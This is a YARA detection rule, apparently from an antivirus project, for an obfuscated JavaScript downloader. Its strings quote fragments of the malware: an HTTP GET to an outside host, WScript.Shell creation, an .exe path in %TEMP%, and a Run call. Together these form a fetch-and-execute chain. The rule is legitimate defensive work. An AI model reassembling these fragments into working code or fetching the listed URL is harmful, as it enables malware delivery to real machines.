rule sig_20160401_f7ecedaab80ab1397154701f62abd91c {
  meta:
    description = "datamaliciousorder - file 20160401_f7ecedaab80ab1397154701f62abd91c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f93978dc1ddbd718a5c8aebc12122db40fad26b0b2db3dc01468b9503e7da8e1"

  strings:
    $s1  = "DiOto[QaCp](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s2  = "var YpgNam = function EbiTd() {return WScript[FfeMxs](\"WScript\"+\".Shell\");}(), VcQl = 11;" fullword ascii
    $s3  = "function RvmLxa(RjFi, UmgZgr){NyzDmr = NyzDmr * 1; return RjFi - UmgZgr;};" fullword ascii
    $s4  = "if (DiOto[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function YueZed() {return YpgNam[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"3q6A4r8s3D.ex\" + \"e\";};" fullword ascii
    $s6  = "function PgHui(){return HhiPt + \"\";};" fullword ascii
    $s7  = "function YrJs() {return ((UtkUlp == true) && (UtkUlp == UvZny)) ? 1 : NyzDmr;};" fullword ascii
    $s8  = "var CzNm = false;" fullword ascii
    $s9  = "function DglHgi()" fullword ascii
    $s10 = "UtkUlp = true; " fullword ascii
    $s11 = "function TvLml(){return 23;};" fullword ascii
    $s12 = "UvZny = true; " fullword ascii
    $s13 = "var UvZny = false;" fullword ascii
    $s14 = "return RvmLxa(YaSx, IsAgx);" fullword ascii
    $s15 = "function FsQe(MdnLn){YpgNam[\"R\"+\"un\"](MdnLn, NyzDmr, NyzDmr);};" fullword ascii
    $s16 = "var UtkUlp = false;" fullword ascii
    $s17 = "var DyTx = new this[\"Date\"]();" fullword ascii
    $s18 = "}while (QgLsl);" fullword ascii
    $s19 = "function EaIda(XgLoy) {var NmBgu = (1, 2, 3, 4, 5, XgLoy); return NmBgu;};" fullword ascii
    $s20 = "function ErqTrm(){return FfeMxs;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}